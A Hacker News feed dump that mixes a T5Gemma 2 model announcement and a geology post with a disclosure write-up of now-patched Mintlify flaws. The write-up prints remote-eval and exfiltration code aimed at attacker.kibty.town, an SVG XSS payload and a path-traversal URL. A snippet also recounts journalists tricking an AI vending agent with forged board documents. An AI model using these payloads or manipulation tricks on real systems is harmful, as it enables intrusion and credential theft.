<p>But then Long returned—armed with deep knowledge of corporate coups and boardroom power plays. She showed Claudius a PDF “proving” the business was a Delaware-incorporated public-benefit corporation whose mission “shall include fun, joy and excitement among employees of The Wall Street Journal.” She also created fake board-meeting notes naming people in the Slack as board members. </p>

<p>The board, according to the very official-looking (and obviously AI-generated) document, had voted to suspend Seymour’s “approval authorities.” It also had implemented a “temporary suspension of all for-profit vending activities.”</p></blockquote>

<p>Before setting the LLM vending machine loose in the WSJ office, Anthropic conducted the experiment <a href="https://www.youtube.com/watch?v=5KTHvKCrQ00">at their own office</a>:</p>



<p>After awhile, frustrated with the slow pace of their human business partners, the machine started hallucinating:</p>

<blockquote><p>It claimed to have signed a contract with Andon Labs at an address that is the home address of The Simpsons from the television show. It said that it would show up in person to the shop the next day in order to answer any questions. It claimed that it would be wearing a blue blazer and a red tie.</p></blockquote>

<p>It’s interesting, but not surprising, that the journalists were able to mess with the machine much more effectively — coaxing Claudius into full “da, comrade!” mode twice — than the folks at Anthropic.</p>

<ul><li><a href="https://kottke.org/tag/Anthropic">Anthropic</a></li><li><a href="https://kottke.org/tag/artificial%20intelligence">artificial intelligence</a></li><li><a href="https://kottke.org/tag/business">business</a></li><li><a href="https://kottke.org/tag/Joanna%20Stern">Joanna Stern</a></li><li><a href="https://kottke.org/tag/video">video</a></li></ul>








</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[T5Gemma 2: The next generation of encoder-decoder models (136 pts)]]></title>
            <link>https://blog.google/technology/developers/t5gemma-2/</link>
            <guid>46317657</guid>
            <pubDate>Thu, 18 Dec 2025 19:48:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.google/technology/developers/t5gemma-2/">https://blog.google/technology/developers/t5gemma-2/</a>, See on <a href="https://news.ycombinator.com/item?id=46317657">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>

    
    





    

    
      








<div data-analytics-module="{
    &quot;module_name&quot;: &quot;Hero Menu&quot;,
    &quot;section_header&quot;: &quot;T5Gemma 2: The next generation of encoder\u002Ddecoder models&quot;
  }">
      
      
        <p>
          T5Gemma 2 is more than a re-training. It incorporates significant architectural changes while inheriting many of the powerful, next-generation features of the Gemma 3 family.
        </p>
      
    </div>

    

    
      










<div>
    <figure>
      <div>
        <p><img alt="T5Gemma 2 Text" data-component="uni-progressive-image" fetchpriority="high" height="150px" src="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/T5-Keyword_RD1-V01.width-200.format-webp.webp" width="360px" data-sizes="(max-width: 1023px) 100vw,(min-width: 1024px and max-width: 1259) 80vw, 1046px" data-srcset="https://storage.googleapis.com/gweb-uniblog-publish-prod/images/T5-Keyword_RD1-V01.width-800.format-webp.webp 800w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/T5-Keyword_RD1-V01.width-1200.format-webp.webp 1200w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/T5-Keyword_RD1-V01.width-1600.format-webp.webp 1600w, https://storage.googleapis.com/gweb-uniblog-publish-prod/images/T5-Keyword_RD1-V01.width-2200.format-webp.webp 2200w">
        </p>
      </div>
      
    </figure>
  </div>






    

    
    <div data-reading-time="true" data-component="uni-article-body">

            
  
    
    
    
    

    <uni-article-speakable page-title="T5Gemma 2: The next generation of encoder\u002Ddecoder models" listen-to-article="Listen to article" data-date-modified="2025-12-18T18:34:28.666285+00:00" data-tracking-ids="G-HGNBTNCHCQ,G-6NKTLKV14N" data-voice-list="en.ioh-pngnat:Cyan,en.usb-pngnat:Lime" data-script-src="https://www.gstatic.com/readaloud/player/web/api/js/api.js" data-highlight-mode="word-over-paragraph"></uni-article-speakable>
  





            
            
<!--article text-->

  
    <div data-component="uni-article-paragraph" role="presentation" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;T5Gemma 2: The next generation of encoder\u002Ddecoder models&quot;
         }"><p data-block-key="7j9y9"><a href="https://arxiv.org/abs/2512.14856">T5Gemma 2</a> is the next evolution of our encoder-decoder family based on Gemma 3, featuring the first multi-modal and long-context encoder-decoder models.</p><p data-block-key="d5qcc">Unlike T5Gemma, T5Gemma 2 adopts tied word embeddings (over encoder and decoder) and merged decoder self- and cross-attention to save model parameters. It offers compact pre-trained models at sizes of 270M-270M (~370M total, excluding vision encoder), 1B-1B (~1.7B) and 4B-4B (~7B) parameters, making them ideal for rapid experimentation and deployment in on-device applications.</p><h2 data-block-key="amrfl">Background</h2><p data-block-key="f86n5">With the original <a href="https://developers.googleblog.com/en/t5gemma/">T5Gemma</a>, we demonstrated that we could successfully adapt modern, pre-trained decoder-only models into an encoder-decoder architecture, unlocking new versatility. By initializing with weights from a powerful decoder-only model and then applying continued pre-training, we created high-quality, inference-efficient models while bypassing the computational cost of training from scratch.</p><p data-block-key="fljar">T5Gemma 2 extends this into the realm of vision-language models by incorporating key innovations from Gemma 3.</p><h2 data-block-key="dlcqj">What’s new</h2><p data-block-key="3mg06">T5Gemma 2 is more than a re-training. It incorporates significant architectural changes while inheriting many of the powerful, next-generation features of the Gemma 3 family.</p><h3 data-block-key="2sigb">Architectural innovations for efficiency</h3><p data-block-key="djbnv">To maximize efficiency at smaller scales, we have introduced key structural refinements:</p><ul><li data-block-key="8jb3m"><b>Tied embeddings:</b> We now tie the embeddings between the encoder and decoder. This significantly reduces the overall parameter count, allowing us to pack more active capabilities into the same memory footprint — crucial for our new compact 270M-270M model.</li><li data-block-key="81pdv"><b>Merged attention:</b> In the decoder, we adopt a merged attention mechanism, combining self- and cross-attention into a single, unified attention layer. This reduces model parameters and architectural complexity, improving model parallelization and benefiting inference.</li></ul><h3 data-block-key="c6ibb">Next-generation capabilities</h3><p data-block-key="2ls8k">Drawing from Gemma 3, T5Gemma 2 also represents a significant upgrade in model capabilities:</p><ul><li data-block-key="cln6a"><b>Multimodality:</b> T5Gemma 2 models can understand and process images alongside text. By utilizing a highly efficient vision encoder, the models can seamlessly perform visual question answering and multimodal reasoning tasks.</li><li data-block-key="7b1hr"><b>Extended long context:</b> We've dramatically expanded the context window. Leveraging Gemma 3's alternating local and global attention mechanism, T5Gemma 2 can handle context windows of up to 128K tokens.</li><li data-block-key="f1t8a"><b>Massively multilingual:</b> Trained on a larger, more diverse dataset, these models now support over 140 languages out of the box.</li></ul><h2 data-block-key="6i3nf">Performance</h2><p data-block-key="efjl4">T5Gemma 2 sets a new standard for what compact encoder-decoder models can achieve. Our new models demonstrate strong performance across key capability areas, inheriting the powerful multimodal and long-context features from the Gemma 3 architecture.</p></div>
  

  
    

















<uni-image-carousel section-header="T5Gemma 2: The next generation of encoder\u002Ddecoder models" images="[
    
      {
        
          
          
          &quot;src&quot;: [&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/1a_rEj400Y.max-1080x1080.format-webp.webp&quot;,&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/1a_rEj400Y.max-1080x1080.format-webp.webp&quot;],
        
        &quot;alt&quot;: &quot;Stem and Code Bar Chart 1&quot;,
        &quot;isVideo&quot;: false,
        &quot;videoTitle&quot;: &quot;&quot;
      },
    
      {
        
          
          
          &quot;src&quot;: [&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/1b_NoaRso0.max-1080x1080.format-webp.webp&quot;,&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/1b_NoaRso0.max-1080x1080.format-webp.webp&quot;],
        
        &quot;alt&quot;: &quot;Reasoning and Factuality Bar Chart 1&quot;,
        &quot;isVideo&quot;: false,
        &quot;videoTitle&quot;: &quot;&quot;
      },
    
      {
        
          
          
          &quot;src&quot;: [&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/1c_4TfnVTY.max-1080x1080.format-webp.webp&quot;,&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/1c_4TfnVTY.max-1080x1080.format-webp.webp&quot;],
        
        &quot;alt&quot;: &quot;Multilingual Bar Chart 1&quot;,
        &quot;isVideo&quot;: false,
        &quot;videoTitle&quot;: &quot;&quot;
      },
    
      {
        
          
          
          &quot;src&quot;: [&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/1d_udeLl71.max-1080x1080.format-webp.webp&quot;,&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/1d_udeLl71.max-1080x1080.format-webp.webp&quot;],
        
        &quot;alt&quot;: &quot;Multimodal Bar Chart 1&quot;,
        &quot;isVideo&quot;: false,
        &quot;videoTitle&quot;: &quot;&quot;
      },
    
      {
        
          
          
          &quot;src&quot;: [&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/1e_FexKBEb.max-1080x1080.format-webp.webp&quot;,&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/1e_FexKBEb.max-1080x1080.format-webp.webp&quot;],
        
        &quot;alt&quot;: &quot;Long Context Bar Chart 1&quot;,
        &quot;isVideo&quot;: false,
        &quot;videoTitle&quot;: &quot;&quot;
      }
    
  ]">
  
    
  
    
  
    
  
    
  
    
  
</uni-image-carousel>

  

  
    <div data-component="uni-article-paragraph" role="presentation" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;T5Gemma 2: The next generation of encoder\u002Ddecoder models&quot;
         }"><p data-block-key="7j9y9"><i>Pre-training performance of Gemma 3, T5Gemma and T5Gemma 2 across five unique capabilities.</i></p><p data-block-key="d6lo1">As shown in the charts above, T5Gemma 2 delivers:</p><ul><li data-block-key="ig02"><b>Strong multimodal performance</b>, outperforming Gemma 3 on several benchmarks. We adapt text-only Gemma 3 base models (270M and 1B) into effective multimodal encoder-decoder models.</li><li data-block-key="c9e34"><b>Superior long-context capability</b>, with substantial quality gains over Gemma 3 and T5Gemma. Using a separate encoder makes T5Gemma 2 better at handling long-context problems.</li><li data-block-key="8d2dk"><b>Improved general capabilities</b>. Across coding, reasoning and multilingual tasks, T5Gemma 2 generally surpasses its corresponding Gemma 3 counterpart.</li></ul></div>
  

  
    

















<uni-image-carousel section-header="T5Gemma 2: The next generation of encoder\u002Ddecoder models" images="[
    
      {
        
          
          
          &quot;src&quot;: [&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/2a_ujNUT3c.max-1080x1080.format-webp.webp&quot;,&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/2a_ujNUT3c.max-1080x1080.format-webp.webp&quot;],
        
        &quot;alt&quot;: &quot;Stem and Code Bar Chart 2&quot;,
        &quot;isVideo&quot;: false,
        &quot;videoTitle&quot;: &quot;&quot;
      },
    
      {
        
          
          
          &quot;src&quot;: [&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/2b_FTIWGlT.max-1080x1080.format-webp.webp&quot;,&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/2b_FTIWGlT.max-1080x1080.format-webp.webp&quot;],
        
        &quot;alt&quot;: &quot;Reasoning and Factuality Bar Chart 2&quot;,
        &quot;isVideo&quot;: false,
        &quot;videoTitle&quot;: &quot;&quot;
      },
    
      {
        
          
          
          &quot;src&quot;: [&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/2c_sT6yU5w.max-1080x1080.format-webp.webp&quot;,&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/2c_sT6yU5w.max-1080x1080.format-webp.webp&quot;],
        
        &quot;alt&quot;: &quot;Multilingual Bar Chart 2&quot;,
        &quot;isVideo&quot;: false,
        &quot;videoTitle&quot;: &quot;&quot;
      },
    
      {
        
          
          
          &quot;src&quot;: [&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/2d_lLPQSDG.max-1080x1080.format-webp.webp&quot;,&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/2d_lLPQSDG.max-1080x1080.format-webp.webp&quot;],
        
        &quot;alt&quot;: &quot;Multimodal Bar Chart 2&quot;,
        &quot;isVideo&quot;: false,
        &quot;videoTitle&quot;: &quot;&quot;
      },
    
      {
        
          
          
          &quot;src&quot;: [&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/2e_noRgImg.max-1080x1080.format-webp.webp&quot;,&quot;https://storage.googleapis.com/gweb-uniblog-publish-prod/images/2e_noRgImg.max-1080x1080.format-webp.webp&quot;],
        
        &quot;alt&quot;: &quot;Long Context Bar Chart 2&quot;,
        &quot;isVideo&quot;: false,
        &quot;videoTitle&quot;: &quot;&quot;
      }
    
  ]">
  
    
  
    
  
    
  
    
  
    
  
</uni-image-carousel>

  

  
    <div data-component="uni-article-paragraph" role="presentation" data-analytics-module="{
           &quot;module_name&quot;: &quot;Paragraph&quot;,
           &quot;section_header&quot;: &quot;T5Gemma 2: The next generation of encoder\u002Ddecoder models&quot;
         }"><p data-block-key="7j9y9"><i>Post-training performance.</i> <i>Note: we are not releasing any post-trained / IT checkpoints. These results here are only for illustration, where we performed a minimal SFT without RL for T5Gemma 2. Also note pre-training and post-training benchmarks are different, so scores are not comparable across plots.</i></p><p data-block-key="8rk3r">Similar to the original T5Gemma, we find that the post-training performance of T5Gemma 2 generally yields better results than its decoder-only counterparts. This makes T5Gemma 2 suitable for both large language model research as well as downstream applications.</p><h2 data-block-key="9kp0s">Getting started</h2><p data-block-key="c0599">We’re looking forward to seeing what the community builds with T5Gemma 2. This release includes pre-trained checkpoints, designed to be post-trained by developers for specific tasks before deployment.</p><p data-block-key="1jig8">These pre-trained checkpoints are available now for broad use across several platforms:</p><ul><li data-block-key="2tb99"><a href="https://arxiv.org/abs/2512.14856"><b>Read the paper on arXiv</b></a></li><li data-block-key="6f6t2"><a href="https://www.kaggle.com/models/google/t5gemma-2"><b>Download on Kaggle</b></a></li><li data-block-key="a01iv"><a href="https://huggingface.co/collections/google/t5gemma-2"><b>Available on Hugging Face</b></a></li><li data-block-key="fqg6k"><a href="https://colab.research.google.com/github/google-gemini/gemma-cookbook/blob/main/Research/[T5Gemma_2]Example.ipynb"><b>Explore via Colab</b></a></li><li data-block-key="4jh5a"><a href="https://console.cloud.google.com/vertex-ai/publishers/google/model-garden/t5gemma"><b>Run Inference via Vertex AI</b></a></li></ul></div>
  


            
            

            
              




            
          </div>
  </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How to hack Discord, Vercel and more with one easy trick (152 pts)]]></title>
            <link>https://kibty.town/blog/mintlify/</link>
            <guid>46317546</guid>
            <pubDate>Thu, 18 Dec 2025 19:41:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://kibty.town/blog/mintlify/">https://kibty.town/blog/mintlify/</a>, See on <a href="https://news.ycombinator.com/item?id=46317546">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><div><p><strong>this blogpost was a collaboration with two people, their articles are here: <a href="https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28">hackermon</a> and <a href="https://heartbreak.ing/">mdl</a></strong></p>
<p>this started when i was notified that discord switched documentation platforms to <a href="https://mintlify.com/">mintlify</a>, a company i briefly looked into before, and i thought it would be a good idea to take another look now that theyre bigger.</p>
<h2>introduction</h2>
<p>mintlify is a b2b saas documentation platform that allows companies to make documentation via MDX files and they host it for them, and add styling, etc.</p>
<p>some of their customers would include:</p>
<ul>
<li>discord</li>
<li>twitter</li>
<li>vercel</li>
<li>cursor</li>
</ul>
<p>...and more, you can view a full list <a href="https://www.mintlify.com/customers">here</a></p>
<p>theres also a bunch of ai features and stuff, but thats beyond the point</p>
<p>so, i signed up and got to digging.</p>
<h2>the rce (CVE-2025-67843)</h2>
<p>mintlify uses MDX to render docs their customers provide, and i was wondering how they render it on the server-side for static page generation (because a docs site needs that for search engines/bots).</p>
<p>this is because mdx is basically jsx (think react) combined with markdown, meaning you can add js expressions to your markdown. so whats preventing us from making a jsx expression that evaluates code on the server?</p>
<p>well, i tried it with a simple payload to just eval things from a webserver</p>
<pre><code>{!!<span>fetch</span>(<span>"https://attacker.kibty.town"</span>).<span>then</span>(<span>(<span>r</span>) =&gt;</span> r.<span>text</span>()).<span>then</span>(<span>(<span>c</span>) =&gt;</span> <span>eval</span>(c))}
</code></pre>
<p>i deployed it to mintlify and went to the page it was on, and i got a request from a vercel/amazon ip! are they really doing this on their nextjs app?</p>
<p>i wrote a simple script to exfilitrate some data such as the process.env (and app files) to find out:</p>
<pre><code><span>const</span> <span>exfil</span> = (<span>data</span>) =&gt;
  <span>fetch</span>(<span>"https://attacker.kibty.town"</span>, {
    <span>method</span>: <span>"POST"</span>,
    <span>body</span>: <span>JSON</span>.<span>stringify</span>(data),
  });
<span>exfil</span>({ <span>files</span>: [{ <span>name</span>: <span>".env.json"</span>, <span>content</span>: <span>JSON</span>.<span>stringify</span>(process.<span>env</span>) }] });
<span>try</span> {
  <span>import</span>(<span>"fs"</span>).<span>then</span>(<span>async</span> (a) =&gt; {
    <span>const</span> arr = [];
    <span>for</span> (<span>const</span> filename <span>of</span> a.<span>readdirSync</span>(<span>"."</span>, { <span>recursive</span>: <span>true</span> })) {
      <span>if</span> (a.<span>lstatSync</span>(filename).<span>isDirectory</span>()) <span>continue</span>;
      <span>const</span> content = a.<span>readFileSync</span>(filename, <span>"utf-8"</span>);
      arr.<span>push</span>({ <span>name</span>: filename, content });
    }
    <span>console</span>.<span>log</span>(arr.<span>length</span>);
    <span>await</span> <span>exfil</span>({ <span>files</span>: arr });
    <span>console</span>.<span>log</span>(<span>"done exfiling"</span>);
  });
} <span>catch</span> (error) {
  <span>exfil</span>(error);
}
</code></pre>
<p>and, after running it, this is what i got:</p>
<p><img src="https://kibty.town/files/img/posts/mintlify/next-env.png" alt=""></p>
<p><strong>shit. this is bad, we have full access.</strong></p>
<h3>impact</h3>
<p>i quickly realised that this was the server-side serverless (lol) environment of their main documentation app, while this calls to a external api to do everything, we have the token it calls it with in the env.</p>
<p>alongside, we can poison the nextjs cache for everyone <strong>for any site</strong>, allowing mass xss, defacing, etc on any docs site.</p>
<p>we can also pretend nonexistent pages exist in the cache, allowing targeted xss too</p>
<p>with the other keys we could also:</p>
<ul>
<li>poisoned mintlifys analytics</li>
<li>ruined mintlifys feature flagging</li>
<li>dos'ed customer sites via path validations</li>
<li>trigger a bunch of pdf exports which would jack up mintlifys cloudconvert bill</li>
</ul>
<p>so:</p>
<ul>
<li>mass xss (on customer domains)</li>
<li>targeted xss (on custom domains)</li>
</ul>
<p>very bad.</p>
<h2>targeted xss (CVE-2025-67842)</h2>
<p>after getting all of the server routes, i noticed a interesting one: <code>/_mintlify/static/[subdomain]/{...path}</code>. this route seemed to allow you to get static images from your repository, such as svgs, pngs, etc.</p>
<p>what if i could access my organizations asset from another domain?</p>
<p>well i tried, i crafted a url that looked like</p>
<pre><code>https://discord.com/_mintlify/static/evascoolcompany/xss.svg
</code></pre>
<p>which, the svg on my repository having this content:</p>
<pre><code><span>&lt;<span>svg</span> <span>xmlns</span>=<span>"http://www.w3.org/2000/svg"</span> <span>onload</span>=<span>"alert(window.origin);"</span>/&gt;</span>
</code></pre>
<p>and when i went to the url, i got this:</p>
<p><img src="https://kibty.town/files/img/posts/mintlify/discord-alert.png" alt=""></p>
<p><strong>well, fuck.</strong></p>
<h3>impact</h3>
<p>this allows complete 1 click xss on users who click a link. definitely not great, but it makes the fact worse that most companies dont properly scope cookies, or have their documentation on a subpath (such as <code>/path</code>).</p>
<p>the latter was true in discords case, their documentation was on <code>/developers/docs</code>, and i can just get the <code>token</code> value from localstorage directly, and exfiltrate it using whatever i want</p>
<p>some other companies that i could do full exploitation on are twitter, vercel and cursor. though we did not check many companies and there is definitely more</p>
<h2>an unexpected message</h2>
<p>a few hours after i started looking into this, i got an unexpected, sort of out of nowhere message from a friend, <a href="https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28">hackermon</a>, who had found the targeted xss independently aswell</p>
<p><img src="https://kibty.town/files/img/posts/mintlify/hackermon-message.png" alt=""></p>
<p>we started looking into this together, alongside <a href="https://heartbreak.ing/">mdl</a>, who was also looking into it with hackermon</p>
<p>also checkout their blogposts <a href="https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28">here</a> and <a href="https://heartbreak.ing/">here!</a> (respectively)</p>
<p>we also got in contact with mintlify, and started disclosing everything we already had and future things directly to them</p>
<h2>here comes the patch bypass (CVE-2025-67845)</h2>
<p>after mintlify patched the targeted xss via static, i was looking at the code for the route and had an idea</p>
<p>the code for the endpoint looked like this (not exact, recreation):</p>
<pre><code><span>export</span> <span>async</span> <span>function</span> <span>GET</span>(<span>_, { params }</span>) {
  <span>const</span> { subdomain, <span>path</span>: pathParts } = <span>await</span> params;
  <span>const</span> path = <span>"/"</span> + pathParts.<span>join</span>(<span>"/"</span>);

  <span>const</span> url = <span>`<span>${CDN_BASE_URL}</span>/<span>${subdomain}</span><span>${path}</span>`</span>;
  <span>const</span> res = <span>await</span> <span>fetch</span>(url);

  <span>if</span> (!res.<span>ok</span>)
    <span>return</span> <span>new</span> <span>NextResponse</span>(<span>"Asset not found"</span>, {
      <span>status</span>: <span>404</span>,
    });

  <span>return</span> res; <span>// inaccurate, does more operations but we simply dont care about them here</span>
}
</code></pre>
<p>and i realised, nothing prevents us from adding url encoded path traversal in a part of a path, to climb up the cdn path</p>
<p>so i crafted a url and tested, it looked like</p>
<pre><code>https://discord.com/_mintlify/static/discord/images/create-team-owned-app.png%2F..%2F..%2F..%2Fevascoolcompany%2Fxss.svg
</code></pre>
<p>and i was met with the beautiful alert page again</p>
<p><img src="https://kibty.town/files/img/posts/mintlify/discord-alert.png" alt=""></p>
<p>always remember to encode your paths properly!</p>
<h2>non-critical vulnerabilities</h2>
<p>alongside this, i found a few non-critical vulnerabilties which don't deserve an entire section, so here they are:</p>
<ul>
<li>github idor (CVE-2025-67844): mintlify doesn't validate the github repository owner/name fields on their api while your setting it, allowing you to set it to any authorized repository. allowing you to view commit details (message, hash, filename, files changed, etc) for new commits</li>
<li>downgrade attack (CVE-2025-67846): mintlify uses vercel to facilitate deployments of both their client and the dashboard. a common pitfall when using vercel is that you fail to remove a previous deployment with a vulnerability in it, so you can target a specific previous vulnerable deployment id / git branch / git ref, and use that to facilitate the patched exploit.</li>
</ul>
<p>add it to your repository, wait for the deployment to build and access it on any mintlify-provided documentation/custom domain with the path <code>/_mintlify/static/evascoolcompany/xss.svg</code> or similar with prefixes</p>
<h2>lets talk impact (again)</h2>
<p>all together, i think this series of vulnerabilities had very big impact. considering we could supply chain attack various big fortune 500 companies, including but not limited to:</p>
<ul>
<li>discord</li>
<li>twitter</li>
<li>vercel</li>
<li>cursor</li>
</ul>
<p>...and more, you can view a full list <a href="https://www.mintlify.com/customers">here</a></p>
<p>we could on targeted companies:</p>
<ul>
<li>override pages on docs to deface, or xss</li>
<li>get 1 click xss</li>
<li>view commits or push to repositories</li>
</ul>
<h2>the patch</h2>
<p>after we got in contact with mintlify, everything was patched very swiftly. and i was awarded <strong>5,000 USD</strong> for my efforts and findings.</p>
<p>the patches for the vulnerabilties were:</p>
<ul>
<li>the rce (CVE-2025-67843): not parsing non-simple mdx expressions on ssr, but still parsing on client</li>
<li>targeted xss (CVE-2025-67842): you are now not able to reach any mintlify assets that are not on the same organization</li>
<li>targeted xss patch bypass (CVE-2025-67845): theres now checks to make sure you aren't path traversing the cdn path</li>
<li>github idor (CVE-2025-67844): its now checked on setting github repository that the github app installation registered to your mintlify account has access to the specified repository</li>
<li>downgrade attack (CVE-2025-67846): theres now a visitor password on preview deployments on vercel and purging old deployments that were vulnerable, you can read the vercel documentation on this <a href="https://vercel.com/kb/guide/how-do-i-delete-an-individual-deployment">here</a></li>
</ul>
<p>make sure to check out <a href="https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28">hackermon</a> and <a href="https://heartbreak.ing/">mdl</a>'s reports for more details on other vulnerabilties, and the possible exploitation that couldve happened.</p>
<p><img src="https://kibty.town/files/img/posts/mintlify/cve-card.png" alt=""></p>
<p><em>card by <a href="https://marsh.zone/">marshift</a></em></p>
</div></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Scottish Highlands, the Appalachians, Atlas are the same mountain range (123 pts)]]></title>
            <link>https://vividmaps.com/central-pangean-mountains/</link>
            <guid>46317174</guid>
            <pubDate>Thu, 18 Dec 2025 19:15:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://vividmaps.com/central-pangean-mountains/">https://vividmaps.com/central-pangean-mountains/</a>, See on <a href="https://news.ycombinator.com/item?id=46317174">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="cm-primary">

			
<article sdfdfds="" id="post-26057">
	
	
	<div>
	
<p>The <a href="https://en.wikipedia.org/wiki/Central_Pangean_Mountains" target="_blank" rel="noreferrer noopener">Central Pangean Mountains</a> were a great mountain chain in the middle part of the supercontinent Pangaea that stretches across the continent from northeast to southwest during the Carboniferous, Permian Triassic periods. The ridge was formed as a consequence of a collision between the supercontinents Laurussia and Gondwana during the formation of <a href="https://vividmaps.com/map-of-pangea/" target="_blank" rel="noreferrer noopener">Pangaea</a>. It was similar to the present Himalayas at its highest elevation during the beginning of the Permian period.</p>




<p>It’s hard to imagine now that once upon a time that the <a href="https://en.wikipedia.org/wiki/Scottish_Highlands" target="_blank" rel="noreferrer noopener">Scottish Highlands</a>, <a href="https://en.wikipedia.org/wiki/Appalachian_Mountains" target="_blank" rel="noreferrer noopener">the Appalachians</a>, <a href="https://en.wikipedia.org/wiki/Ouachita_Mountains" target="_blank" rel="noreferrer noopener">the Ouachita Mountains</a>, and <a href="https://en.wikipedia.org/wiki/Anti-Atlas" target="_blank" rel="noreferrer noopener">the Little Atlas of Morocco</a> are the same mountain range, once connected as the Central Pangean Mountains.</p>



<figure><a href="https://vividmaps.com/wp-content/uploads/2021/03/Central-Pangean-Mountains.jpg"><img fetchpriority="high" decoding="async" width="804" height="960" src="https://vividmaps.com/wp-content/uploads/2021/03/Central-Pangean-Mountains.jpg" alt="Map of the Central Pangean Mountains" srcset="https://vividmaps.com/wp-content/uploads/2021/03/Central-Pangean-Mountains.jpg 804w, https://vividmaps.com/wp-content/uploads/2021/03/Central-Pangean-Mountains-251x300.jpg 251w, https://vividmaps.com/wp-content/uploads/2021/03/Central-Pangean-Mountains-768x917.jpg 768w" sizes="(max-width: 804px) 100vw, 804px"></a></figure>



<p>During the Permian period, the Central Pangean were subjected to significant physical weathering, decreasing the peaks and forming many deep intermontane plains. By the Middle Triassic, the mountain sierras had been considerably reduced in size. By the beginning of the Jurassic period (200 mln years ago), the Pangean chain in Western Europe disappeared to some highland regions separated by deep marine basins.</p>

<!-- CONTENT END 1 -->
</div>

	
	</article>
		</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[We pwned X, Vercel, Cursor, and Discord through a supply-chain attack (873 pts)]]></title>
            <link>https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28</link>
            <guid>46317098</guid>
            <pubDate>Thu, 18 Dec 2025 19:08:48 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28">https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28</a>, See on <a href="https://news.ycombinator.com/item?id=46317098">Hacker News</a></p>
<div id="readability-page-1" class="page"><p>
    How we pwned X (Twitter), Vercel, Cursor, Discord, and hundreds of companies through a supply-chain attack
  </p><div id="file-writeup-md" tabindex="0" role="region" aria-label="writeup.md content, created by hackermondev on 08:44PM on December 16.">
    <article itemprop="text"><p dir="auto">hi, i'm daniel. i'm a 16-year-old high school senior. in my free time, i <a href="https://hackerone.com/daniel" rel="nofollow">hack billion dollar companies</a> and build cool stuff.</p>
<p dir="auto">about a month ago, a couple of friends and I found serious critical vulnerabilities on Mintlify, an AI documentation platform used by some of the top companies in the world.</p>
<p dir="auto">i found a critical cross-site scripting vulnerability that, if abused, would let an attacker to inject malicious scripts into the documentation of numerous companies and steal credentials from users with a single link open.</p>
<p dir="auto">(go read my friends' writeups (after this one)) <br>
<a href="https://kibty.town/blog/mintlify/" rel="nofollow">how to hack discord, vercel, and more with one easy trick (eva)</a> <br>
<a href="https://heartbreak.ing/" rel="nofollow">Redacted by Counsel: A supply chain postmortem (MDL)</a></p>
<p dir="auto">here's my story...</p>

<p dir="auto">My story begins on Friday, November 7, 2025, when Discord announced a brand new update to their developer documentation platform. They were previously using a custom built documentation platform, but were switching to an AI-powered documentation platform.</p>
